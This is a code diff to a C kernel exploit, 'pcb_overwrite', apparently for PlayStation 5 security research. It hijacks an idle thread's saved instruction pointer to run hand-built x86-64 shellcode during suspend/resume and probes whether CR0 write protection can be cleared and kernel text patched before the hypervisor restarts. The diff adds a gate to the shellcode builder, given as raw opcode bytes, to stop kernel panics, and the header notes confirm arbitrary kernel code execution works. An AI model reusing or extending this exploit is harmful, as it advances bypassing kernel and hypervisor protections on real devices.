@@ -1,26 +1,36 @@
 #include <stdint.h>
 
 /*
- * pcb_overwrite v3 — HV probe via idle PCB hijack
+ * pcb_overwrite v4 — HV probe via idle PCB hijack (gated)
  *
  * === v2 CONFIRMED WORKING 2026-03-07 ===
  *   Trampoline executed on resume, wrote sentinel, jumped to sw_return.
  *   Kernel resumed cleanly. Arbitrary code execution via PCB hijack proven.
  *
- * v3 GOAL — PROBE HYPERVISOR STATE DURING RESUME:
- *   The hypothesis (from PS5 security research): during suspend/resume,
- *   code that runs early enough in the resume path executes BEFORE the
- *   hypervisor restarts. In this window:
- *     - CR0.WP can be cleared (HV normally intercepts this)
- *     - Ktext is writable (HV's NPT normally blocks this)
- *     - Kernel patches can be applied before HV re-establishes protections
+ * === v3 CONFIRMED WORKING 2026-03-07 ===
+ *   HV probe ran during resume. CR0.WP was stuck (HV active at PCB
+ *   hijack point). PCB hijack runs too late — HV already restarted.
  *
- *   v3 tests this by having the resume trampoline:
- *     1. Write HJK_RAN! sentinel (proof of execution, same as v2)
- *     2. Snapshot CR0, CR4, EFER
- *     3. Attempt to clear CR0.WP
- *     4. If WP cleared: attempt to write 8 bytes to ktext, verify, restore
- *     5. Record all results to kdata for phase 2 verification
+ * v4 FIX — GATED STUB TO PREVENT KERNEL PANICS:
+ *   v3 had a reliability problem: during the persistence loop (~60s of
+ *   hammering pcb_rip), the idle thread gets scheduled and executes the
+ *   stub during NORMAL operation. Each execution calls hv_probe which
+ *   does writecr0(cr0 & ~CR0_WP), triggering a VMEXIT. Rapid repeated
+ *   VMEXITs from the idle thread context destabilize the kernel → panic.
+ *
+ *   v4 adds a GATE at kdata+0x460:
+ *     - gate=0 (default): stub skips hv_probe, just jmp sw_return (safe)
+ *     - gate=1 (set by kldload before standby): stub runs hv_probe
+ *   This prevents dangerous hv_probe execution during normal operation
+ *   while still allowing it during resume.
+ *
+ *   v3/v4 tests the HV by having the resume trampoline:
+ *     1. Check gate — skip if 0
+ *     2. Write HJK_RAN! sentinel (proof of execution, same as v2)
+ *     3. Snapshot CR0, CR4, EFER
+ *     4. Attempt to clear CR0.WP
+ *     5. If WP cleared: attempt to write 8 bytes to ktext, verify, restore
+ *     6. Record all results to kdata for phase 2 verification
  *
  *   The trampoline is a small asm stub that calls a compiled C function
  *   (hv_probe), then jumps to sw_return for clean kernel resumption.
@@ -162,6 +172,12 @@
 #define KDATA_HV_RESULT      0x450
 #define KDATA_EFER_VAL       0x458
 
+/* Gate: 0 = stub skips hv_probe (safe during normal operation),
+ * nonzero = stub runs hv_probe (set by kldload just before standby).
+ * This prevents the idle thread from repeatedly triggering VMEXITs
+ * via writecr0 during normal operation, which causes kernel panics. */
+#define KDATA_GATE_OFF       0x460
+
 /* HV probe result codes */
 #define HV_WP_CLEARED_KTEXT_RW    1  /* WP cleared AND ktext writable → NO HV */
 #define HV_WP_STUCK               2  /* CR0.WP stuck → HV intercepting */
@@ -301,17 +317,29 @@ hv_probe(uint64_t kdata_base, uint64_t ktext_probe_addr)
 }
 
 /*
- * Build trampoline stub that:
- *   1. Writes STUB_SENTINEL to kdata+0x408 (proof stub itself executed)
- *   2. Calls hv_probe(kdata_base, ktext_probe_addr)
- *   3. Jumps to sw_return
+ * Build gated trampoline stub that:
+ *   1. Checks gate at kdata+0x460: if 0, skip to sw_return (safe nop)
+ *   2. Writes STUB_SENTINEL to kdata+0x408 (proof stub itself executed)
+ *   3. Calls hv_probe(kdata_base, ktext_probe_addr)
+ *   4. Jumps to sw_return
  *
- * This diagnostic split lets phase 2 distinguish:
+ * The gate prevents hv_probe from running during normal operation.
+ * During the persistence loop, gate=0: the idle thread may execute the
+ * stub but it just jumps straight to sw_return (no VMEXITs, no danger).
+ * kldload sets gate=1 via kekcall just before entering standby.
+ * On resume, gate=1: stub runs hv_probe as intended.
+ *
+ * Diagnostic sentinels (phase 2 reads these):
  *   - Neither sentinel → stub never ran (PCB overwrite lost before suspend)
  *   - Stub sentinel only → stub ran but call to hv_probe failed/crashed
  *   - Both sentinels → full success
  *
  * Shellcode:
+ *   ; Gate check
+ *   movabs rcx, gate_addr          ; 10 bytes
+ *   mov    rax, [rcx]              ; 3 bytes
+ *   test   rax, rax                ; 3 bytes
+ *   jz     .skip                   ; 2 bytes  (skip hv_probe path)
  *   ; Write stub sentinel (proof the asm stub executed)
  *   movabs rax, STUB_SENTINEL      ; 10 bytes
  *   movabs rcx, stub_sent_addr     ; 10 bytes
@@ -321,17 +349,19 @@ hv_probe(uint64_t kdata_base, uint64_t ktext_probe_addr)
  *   movabs rsi, ktext_probe_addr   ; 10 bytes  (arg 2)
  *   movabs rax, hv_probe_addr      ; 10 bytes
  *   call   rax                     ; 2 bytes   (FF D0)
+ *   ; .skip:
  *   ; Return to kernel
  *   movabs rax, sw_return_addr     ; 10 bytes
  *   jmp    rax                     ; 2 bytes   (FF E0)
  *
- * Total: 67 bytes.
+ * Total: 85 bytes.
  *
  * Register safety:
  *   - rdi, rsi, rax, rcx: clobbered (caller-saved, not in PCB)
  *   - hv_probe() is a normal C function: preserves rbx, rbp, r12-r15
  *   - rsp: balanced by call/ret pair
  *   - After stub returns to sw_return: all PCB regs intact
+ *   - When gate=0: only rax, rcx clobbered (minimal impact)
  */
 static int build_hv_probe_stub(uint64_t dest, uint64_t kdata_base,
                                 uint64_t ktext_probe_addr,
@@ -340,7 +370,24 @@ static int build_hv_probe_stub(uint64_t dest, uint64_t kdata_base,
 {
     volatile uint8_t* p = (volatile uint8_t*)dest;
     int i = 0;
+    uint64_t gate_addr = kdata_base + KDATA_GATE_OFF;
     uint64_t stub_sent_addr = kdata_base + KDATA_STUB_SENT_OFF;
+
+    /* --- Gate check: skip hv_probe if gate == 0 --- */
+
+    /* movabs rcx, gate_addr */
+    p[i++] = 0x48; p[i++] = 0xB9;
+    for (int b = 0; b < 8; b++) p[i++] = (gate_addr >> (b * 8)) & 0xFF;
+
+    /* mov rax, [rcx] */
+    p[i++] = 0x48; p[i++] = 0x8B; p[i++] = 0x01;
+
+    /* test rax, rax */
+    p[i++] = 0x48; p[i++] = 0x85; p[i++] = 0xC0;
+
+    /* jz .skip (jump over hv_probe path to sw_return)
+     * hv_probe path = 10+10+3 + 10+10+10+2 = 55 bytes */
+    p[i++] = 0x74; p[i++] = 55;
 
     /* --- Write stub sentinel (diagnostic: did the stub start?) --- */
 
@@ -372,7 +419,7 @@ static int build_hv_probe_stub(uint64_t dest, uint64_t kdata_base,
     /* call rax */
     p[i++] = 0xFF; p[i++] = 0xD0;
 
-    /* --- Return to kernel --- */
+    /* --- .skip: Return to kernel --- */
 
     /* movabs rax, sw_return_addr */
     p[i++] = 0x48; p[i++] = 0xB8;
@@ -381,7 +428,7 @@ static int build_hv_probe_stub(uint64_t dest, uint64_t kdata_base,
     /* jmp rax */
     p[i++] = 0xFF; p[i++] = 0xE0;
 
-    return i;  /* 67 */
+    return i;  /* 85 */
 }
 
 static void phase1_arm(uint64_t kdata_base, uint64_t exec_code,
@@ -471,9 +518,10 @@ static void phase1_arm(uint64_t kdata_base, uint64_t exec_code,
         write8(kdata_base + KDATA_BACKUP_OFF, orig_rip);
         write8(kdata_base + KDATA_BACKUP_OFF + 8, stub_addr);
 
-        /* Clear sentinels and all HV probe result slots */
+        /* Clear sentinels, gate, and all HV probe result slots */
         write8(kdata_base + KDATA_SENT_OFF, 0);
         write8(kdata_base + KDATA_STUB_SENT_OFF, 0);
+        write8(kdata_base + KDATA_GATE_OFF, 0);  /* gate=0: stub is a safe nop */
         for (int off = KDATA_CR0_BEFORE; off <= KDATA_EFER_VAL; off += 8)
             write8(kdata_base + off, 0);
 
